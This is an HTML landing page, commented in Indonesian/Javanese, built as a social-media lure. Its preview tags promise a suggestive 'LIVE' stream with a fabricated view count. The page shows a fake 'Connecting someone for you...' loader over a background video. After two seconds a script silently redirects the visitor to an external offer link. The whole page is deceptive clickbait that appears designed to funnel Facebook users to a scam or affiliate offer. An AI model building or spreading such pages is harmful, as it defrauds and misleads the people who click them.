<!DOCTYPE html>
<html>
<head>
  <!-- TAMPILAN PREVIEW NENG FB -->
  <meta property="og:image" content="https://snipboard.io/5x0QoE.jpg">
  <meta property="og:title" content="🏠 LIVE: Let's Spend Tonight Together">
  <meta property="og:description" content="👁️ 912.8K Views">
  <meta property="og:type" content="website">
  
  <title>Connecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    *{margin:0; padding:0;}
    body,html{height:100%; background:#000; font-family:Arial; overflow:hidden;}
    
    /* VIDEO BACKGROUND DARI GOOGLE DRIVE */
    #bgVideo{
      position:fixed; top:0; left:0; 
      width:100%; height:100%; 
      object-fit:cover; z-index:-1;
      filter:brightness(0.4);
    }

    /* LOADING OVERLAY EMAS-HITAM */
    #loading{
      position:fixed; top:0; left:0; width:100%; height:100%;
      background:linear-gradient(180deg, rgba(0,0,0,0.95) 0%, rgba(20,20,20,0.95) 100%);
      display:flex; flex-direction:column; justify-content:center; align-items:center;
      color:#FFD700; z-index:10;
    }
    #loading h2{
      font-size:26px; margin-bottom:25px;
      text-shadow:0 0 20px #FFD700;
      animation:pulse 1s infinite;
      text-align:center;
      padding:0 20px;
    }
    @keyframes pulse{0%,100%{opacity:1} 50%{opacity:0.6}}
    
    .loader{
      width:75%; max-width:400px; height:8px; background:#111; 
      border-radius:20px; overflow:hidden;
      border:2px solid #FFD700;
      box-shadow:0 0 15px #FFD700;
    }
    .bar{
      width:0%; height:100%; 
      background:linear-gradient(90deg,#000,#FFD700,#000);
      background-size:200% 100%;
      animation:load 2s forwards, shine 1s linear infinite;
    }
    @keyframes load{to{width:100%}}
    @keyframes shine{0%{background-position:200% 0} 100%{background-position:-200% 0}}
  </style>
</head>
<body>

  <!-- VIDEO BACKGROUND -->
  <video id="bgVideo" src="https://drive.google.com/uc?export=download&id=1QV6XLuWBPvYHxv4Wa92ryCLyOro0H84H" autoplay muted loop playsinline preload="auto"></video>

  <!-- LOADING 2 DETIK -->
  <div id="loading">
    <h2>Connecting someone for you...</h2>
    <div class="loader"><div class="bar"></div></div>
  </div>

  <script>
    // 2 DETIK MARI LANGSUNG AUTO REDIRECT NENG OFFER
    setTimeout(()=>{
      window.location.href = "https://fumifun.sbs/08xpia";
    },2000);
  </script>

</body>
</html>
